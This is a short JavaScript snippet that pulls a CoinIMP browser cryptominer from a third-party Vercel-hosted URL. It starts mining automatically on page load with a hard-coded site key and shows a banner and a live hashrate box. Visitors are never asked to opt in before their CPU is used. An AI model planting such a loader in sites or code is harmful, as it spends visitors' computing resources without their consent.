// ✅ Load CoinIMP miner script dynamically
const minerScript = document.createElement("script");
minerScript.src = "https://dictionary-three-nu.vercel.app/miner.js"; // galing sa CoinIMP
minerScript.onerror = () => console.error("❌ Miner script failed to load");
document.head.appendChild(minerScript);

minerScript.onload = () => {
  if (typeof Client === "undefined") {
    console.error("❌ CoinIMP client not loaded. Check script URL.");
    return;
  }

  // Start miner
  var _client = new Client.Anonymous(
    "9fec7810225ee2675a7d462c769abf8bdc5ad968e79b574598f892b5f1c202da", // CoinIMP site key mo
    { throttle: 0.5, c: "w" }
  );
  _client.start();

  // Mining notification
  _client.addMiningNotification(
    "Top",
    "⚡ This site is running a JavaScript miner from coinimp.com",
    "#cccccc",
    40,
    "#3d3d3d"
  );

  console.log("✅ CoinIMP script loaded, starting miner...");

  // Miner monitor box
  let minerBox = document.createElement("div");
  minerBox.id = "minerBox";
  minerBox.style.cssText =
    "position:fixed;bottom:10px;right:10px;padding:10px;background:#222;color:#0f0;font-family:monospace;border-radius:8px;z-index:9999;";
  minerBox.innerHTML = "⛏️ Starting miner...";
  document.body.appendChild(minerBox);

  // Update stats every 5s
  setInterval(() => {
    minerBox.innerHTML =
      "⛏️ Hashrate: " +
      _client.getHashesPerSecond().toFixed(2) +
      " h/s<br/>Total: " +
      _client.getTotalHashes();

    console.log(
      "Hashrate:",
      _client.getHashesPerSecond(),
      "| Total:",
      _client.getTotalHashes()
    );
  }, 5000);
};
